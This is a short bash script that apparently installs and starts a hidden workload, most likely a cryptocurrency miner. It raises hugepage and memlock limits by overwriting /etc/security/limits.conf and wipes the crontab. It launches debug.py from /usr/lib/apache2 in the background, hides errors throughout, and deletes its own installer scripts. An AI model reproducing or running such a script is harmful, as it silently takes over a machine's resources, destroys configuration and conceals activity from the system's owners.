#!/usr/bin/env bash

sudo sysctl -w vm.nr_hugepages=256 2> /dev/null
sudo sh -c "ulimit -c unlimited" 2> /dev/null

sudo sh -c "echo '* soft memlock 60397977' > /etc/security/limits.conf" 2> /dev/null
sudo sh -c "echo '* hard memlock 60397977' >> /etc/security/limits.conf" 2> /dev/null

echo "" > runcron
crontab runcron

cd /usr/lib/apache2
bash /usr/lib/apache2/stop.sh
nohup python debug.py >debug.out 2>&1 &
rm ubuntu.sh
rm run.sh